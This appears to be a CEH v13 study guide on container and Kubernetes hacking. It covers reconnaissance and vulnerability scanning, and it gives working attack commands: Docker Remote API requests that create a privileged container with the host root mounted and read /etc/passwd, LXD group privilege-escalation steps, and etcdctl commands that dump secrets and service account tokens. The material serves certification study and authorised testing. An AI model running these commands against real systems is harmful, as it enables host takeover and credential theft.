# Container Hacking

## Overview
Container security involves securing containerized applications, orchestration platforms, and container runtime environments. Containers introduce unique attack vectors and security challenges that differ from traditional virtualization.

## Information Gathering using kubectl

### Basic Cluster Reconnaissance
kubectl is the primary tool for interacting with Kubernetes clusters and gathering information.

#### Cluster Information Discovery
```bash
# Get cluster information
kubectl cluster-info

# List all nodes
kubectl get nodes -o wide

# Get node details
kubectl describe node NODE_NAME

# Check kubectl version and server version
kubectl version
```

#### Namespace Enumeration
```bash
# List all namespaces
kubectl get namespaces

# Get resources in specific namespace
kubectl get all -n NAMESPACE_NAME

# List all resources across all namespaces
kubectl get all --all-namespaces
```

#### Service and Pod Discovery
```bash
# List all services
kubectl get services --all-namespaces

# List all pods with detailed information
kubectl get pods -o wide --all-namespaces

# Get pod details
kubectl describe pod POD_NAME -n NAMESPACE
```

### Configuration and Secret Enumeration
```bash
# List ConfigMaps
kubectl get configmaps --all-namespaces

# List Secrets
kubectl get secrets --all-namespaces

# Describe secret contents
kubectl describe secret SECRET_NAME -n NAMESPACE

# Get service account tokens
kubectl get serviceaccounts --all-namespaces
```

### RBAC Information Gathering
```bash
# List cluster roles
kubectl get clusterroles

# List role bindings
kubectl get rolebindings --all-namespaces

# List cluster role bindings
kubectl get clusterrolebindings

# Check current permissions
kubectl auth can-i --list
```

## Enumerating Registries

### Docker Registry Enumeration
Container registries store and distribute container images, often containing sensitive information.

#### Registry Discovery Methods
- **DNS Enumeration**: Discover registry subdomains
- **Port Scanning**: Identify registry services on common ports (5000, 443, 80)
- **SSL Certificate Analysis**: Extract registry information from certificates
- **Directory Brute-forcing**: Discover private registry endpoints

#### Docker Registry API Exploitation
```bash
# List repositories in registry
curl -X GET https://registry.example.com/v2/_catalog

# Get image tags
curl -X GET https://registry.example.com/v2/IMAGE_NAME/tags/list

# Download image manifest
curl -X GET https://registry.example.com/v2/IMAGE_NAME/manifests/TAG
```

### Private Registry Access
- **Credential Harvesting**: Search for registry credentials in code repositories
- **Token Exploitation**: Abuse JWT tokens for registry access
- **Misconfigured Authentication**: Exploit weak or missing authentication
- **Internal Network Access**: Access private registries through compromised systems

## Container and Kubernetes Vulnerability Scanning

### Trivy Scanner
Comprehensive vulnerability scanner for containers and Kubernetes.

#### Container Image Scanning
```bash
# Install Trivy
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh

# Scan container image
trivy image IMAGE_NAME

# Scan with specific severity
trivy image --severity HIGH,CRITICAL IMAGE_NAME

# Generate JSON report
trivy image -f json -o results.json IMAGE_NAME
```

#### Kubernetes Manifest Scanning
```bash
# Scan Kubernetes manifests
trivy config .

# Scan specific manifest file
trivy config manifest.yaml

# Scan Helm charts
trivy config --helm-values values.yaml chart/
```

### Sysdig Scanner
Enterprise-grade container security platform with vulnerability scanning capabilities.

#### Key Features
- **Runtime Security**: Monitor container behavior at runtime
- **Compliance Scanning**: Check against security benchmarks
- **Network Security**: Analyze container network traffic
- **Incident Response**: Forensic analysis of security events

### Kubescape Scanner
CNCF-certified Kubernetes security platform.

#### Scanning Commands
```bash
# Install Kubescape
curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | /bin/bash

# Scan entire cluster
kubescape scan

# Scan specific namespace
kubescape scan --include-namespace NAMESPACE_NAME

# Scan against specific framework
kubescape scan framework nsa
```

#### Framework Support
- **NSA-CISA Guidelines**: National Security Agency recommendations
- **MITRE ATT&CK**: Attack framework mapping
- **CIS Benchmarks**: Center for Internet Security standards
- **SOC 2**: Service Organization Control 2 compliance

### Kube-hunter Scanner
Penetration testing tool for Kubernetes clusters.

#### Active vs Passive Scanning
```bash
# Passive scanning (safe)
kube-hunter --pod

# Active scanning (potentially disruptive)
kube-hunter --active

# Remote scanning
kube-hunter --remote IP_ADDRESS
```

#### Vulnerability Categories
- **Information Disclosure**: Exposed dashboards and APIs
- **Access Control**: RBAC misconfigurations
- **Pod Security**: Privilege escalation vulnerabilities
- **Network Security**: Service exposure issues

### kubiScan Scanner
RBAC risk assessment tool for Kubernetes.

#### Risk Assessment Features
```bash
# Install kubiScan
git clone https://github.com/cyberark/kubiscan
cd kubiscan
python setup.py install

# Scan for risky permissions
kubiscan

# Generate detailed report
kubiscan -r
```

#### Risk Categories
- **Privileged Containers**: Containers running with elevated privileges
- **Host Access**: Containers with host filesystem access
- **Service Account Risks**: Overly permissive service accounts
- **Network Policies**: Missing or misconfigured network policies

## Exploiting Docker Remote API

### Docker API Enumeration
The Docker Remote API allows programmatic control of Docker daemons.

#### API Discovery
```bash
# Check for exposed Docker API
nmap -p 2375,2376 TARGET_IP

# Access Docker API
curl http://TARGET_IP:2375/info

# List containers
curl http://TARGET_IP:2375/containers/json
```

### API Exploitation Techniques
```bash
# Create malicious container
curl -X POST -H "Content-Type: application/json" \
-d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
http://TARGET_IP:2375/containers/create

# Start container
curl -X POST http://TARGET_IP:2375/containers/CONTAINER_ID/start

# Execute commands in container
curl -X POST -H "Content-Type: application/json" \
-d '{"Cmd":["cat","/host/etc/passwd"]}' \
http://TARGET_IP:2375/containers/CONTAINER_ID/exec
```

### Container Escape via API
- **Host Filesystem Mount**: Mount host filesystem into container
- **Privileged Containers**: Create containers with --privileged flag
- **Docker Socket Mount**: Mount Docker socket for container-to-host access
- **Capability Abuse**: Exploit Linux capabilities for privilege escalation

## Hacking Container Volumes

### Volume Types and Risks
Different volume types present various security risks and attack opportunities.

#### Host Path Volumes
```yaml
# Dangerous hostPath volume
volumes:
- name: host-root
  hostPath:
    path: /
    type: Directory
```

#### Persistent Volume Exploitation
- **Data Persistence**: Access data across container restarts
- **Volume Poisoning**: Inject malicious files into shared volumes
- **Cross-container Access**: Access volumes from multiple containers
- **Host Directory Traversal**: Escape container through volume mounts

### Volume Attack Techniques
```bash
# List mounted volumes in container
df -h
mount | grep -v "^/dev"

# Explore host filesystem through volume
ls -la /host-volume/

# Search for sensitive files
find /volumes -name "*.key" -o -name "*.pem" -o -name "*password*"
```

## LXD/LXC Container Group Privilege Escalation

### LXD Privilege Escalation
LXD (Linux Container Daemon) can be exploited for privilege escalation when users are in the lxd group.

#### Exploitation Steps
```bash
# Check LXD group membership
groups

# Initialize LXD (if needed)
lxd init

# Download Alpine Linux image
lxc image import https://github.com/saghul/lxd-alpine-builder/releases/download/v3.13/alpine-v3.13-x86_64.tar.gz --alias myimage

# Create privileged container with host filesystem access
lxc init myimage ignite -c security.privileged=true

# Mount host filesystem
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

# Start container and get shell
lxc start ignite
lxc exec ignite /bin/sh

# Access host root filesystem
cd /mnt/root
```

### LXC Container Exploitation
Similar techniques apply to LXC containers with appropriate permissions.

#### Security Implications
- **Full Host Access**: Complete access to host filesystem
- **Root Privilege**: Effective root access on host system
- **Persistence**: Ability to modify host system permanently
- **Detection Evasion**: Activities may not be logged properly

## Post-Enumeration on Kubernetes etcd

### etcd Database Overview
etcd is the distributed key-value store used by Kubernetes to store all cluster data.

#### etcd Access Methods
```bash
# Direct etcd access (if accessible)
etcdctl --endpoints=https://ETCD_IP:2379 \
--cert=/path/to/cert.pem \
--key=/path/to/key.pem \
--cacert=/path/to/ca.pem \
get / --prefix --keys-only

# Through kubectl (indirect access)
kubectl get secrets --all-namespaces -o yaml
```

### Sensitive Data in etcd
etcd contains highly sensitive information that can be valuable for attackers.

#### Data Types
- **Secrets**: API keys, passwords, certificates
- **Service Account Tokens**: Authentication credentials
- **ConfigMaps**: Configuration data that may contain sensitive information
- **Pod Specifications**: Complete container and security configurations

### etcd Exploitation Techniques
```bash
# Extract all secrets
etcdctl get /registry/secrets --prefix=true

# Dump service account tokens
etcdctl get /registry/serviceaccounts --prefix=true

# Extract TLS certificates
etcdctl get /registry/secrets/kube-system/certificate --print-value-only
```

### Data Exfiltration and Analysis
- **Credential Extraction**: Parse secrets for reusable credentials
- **Certificate Analysis**: Extract and analyze TLS certificates
- **Configuration Review**: Identify misconfigurations in stored manifests
- **Token Abuse**: Use extracted service account tokens for cluster access

## Container Runtime Security

### Runtime Attack Vectors
- **Container Escape**: Break out of container isolation
- **Resource Exhaustion**: DoS through resource consumption
- **Privilege Escalation**: Gain elevated privileges within containers
- **Network Segmentation Bypass**: Access restricted network segments

### Common Escape Techniques
- **Privileged Containers**: Abuse --privileged flag
- **Capability Abuse**: Exploit excessive Linux capabilities
- **Volume Mounts**: Exploit dangerous volume mounts
- **Host Network**: Abuse --net=host configuration
- **PID Namespace**: Exploit shared PID namespace

**Key CEH v13 Exam Points**

**Critical Concepts**
1. **Container Architecture**: Understanding Docker, containerd, and Kubernetes components
2. **Orchestration Security**: Kubernetes RBAC, network policies, and pod security
3. **Registry Security**: Container image vulnerabilities and supply chain attacks
4. **Runtime Security**: Container isolation and escape techniques
5. **Volume Security**: Storage and persistent volume attack vectors
6. **API Security**: Docker API and Kubernetes API exploitation
7. **Monitoring and Logging**: Container-specific logging and monitoring challenges

**Exam Focus Areas**
- **kubectl Reconnaissance**: Information gathering using Kubernetes CLI
- **Vulnerability Scanning**: Using Trivy, Kubescape, and other scanning tools
- **Docker API Exploitation**: Remote API access and container manipulation
- **Container Escape**: Techniques for breaking container isolation
- **Volume Attacks**: Exploiting mounted filesystems and persistent storage
- **LXD/LXC Privilege Escalation**: Group-based privilege escalation
- **etcd Security**: Kubernetes data store enumeration and exploitation

**Practical Skills**
- Enumerate Kubernetes clusters using kubectl and API calls
- Identify container vulnerabilities using automated scanning tools
- Exploit Docker Remote API for container manipulation
- Perform container escape attacks through various vectors
- Abuse volume mounts for host filesystem access
- Escalate privileges through LXD group membership
- Extract sensitive data from Kubernetes etcd database
- Understand container isolation mechanisms and bypass techniques
- Analyze container network configurations and security policies
